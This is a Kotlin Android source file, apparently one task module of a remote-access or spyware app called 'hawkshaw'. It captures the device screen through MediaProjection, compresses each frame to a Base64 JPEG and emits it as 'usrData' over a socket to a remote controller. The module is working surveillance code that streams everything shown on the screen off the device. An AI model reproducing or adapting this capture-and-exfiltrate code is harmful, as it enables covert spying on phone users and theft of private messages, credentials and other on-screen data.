package me.hawkshaw.tasks

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjectionManager
import android.os.Handler
import android.os.SystemClock
import android.util.Base64
import android.util.DisplayMetrics
import android.view.WindowManager
import me.hawkshaw.utils.Constants
import org.json.JSONObject
import java.io.ByteArrayOutputStream

class StreamScreen(private val ctx: Context, private val handler: Handler, private val resultCode: Int, private val data: Intent?) : Thread() {

    companion object {
        var flagStop = false
    }

    private fun takeScreenShot() {

        SystemClock.sleep(1000)

        val metrics = DisplayMetrics()
        val windowManager = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val mgr = ctx.getSystemService(Activity.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager

        windowManager.defaultDisplay.getMetrics(metrics)
        val mMediaProjection = mgr.getMediaProjection(resultCode, data)
        val imgReader: ImageReader = ImageReader.newInstance(metrics.widthPixels, metrics.heightPixels, PixelFormat.RGBA_8888, 2)


        val onImageAvailableListener = ImageReader.OnImageAvailableListener { it: ImageReader? ->
            SystemClock.sleep(100)
            val image: Image? = it?.acquireLatestImage()

            if (image != null) {

                val mWidth = image.width
                val mHeight = image.height

                val planes = image.planes
                val buffer = planes[0].buffer
                val pixelStride = planes[0].pixelStride
                val rowStride = planes[0].rowStride
                val rowPadding = rowStride - pixelStride * mWidth


                val bitmap = Bitmap.createBitmap(mWidth + rowPadding / pixelStride, mHeight, Bitmap.Config.ARGB_8888)
                bitmap.copyPixelsFromBuffer(buffer)

                val obj = JSONObject()
                obj.put("name", "ScreenCast")
                obj.put("image64", encodeImage(Bitmap.createScaledBitmap(bitmap, 480, 800, true)))
                obj.put("dataType", "screenCast")

                Constants.socket?.emit("usrData", obj)

            }

            image?.close()
        }

        mMediaProjection.createVirtualDisplay("ScreenCapture", metrics.widthPixels, metrics.heightPixels,
                metrics.densityDpi, DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imgReader.surface, null, handler)

        imgReader.setOnImageAvailableListener(onImageAvailableListener, handler)

        if (flagStop){
            mMediaProjection.stop()
            imgReader.setOnImageAvailableListener(null, null)
        }
    }

    private fun encodeImage(bm: Bitmap): String {
        val baos = ByteArrayOutputStream()
        bm.compress(Bitmap.CompressFormat.JPEG, 100, baos)
        val b = baos.toByteArray()
        return Base64.encodeToString(b, Base64.DEFAULT)
    }

    override fun run() {
        super.run()
        takeScreenShot()
    }
}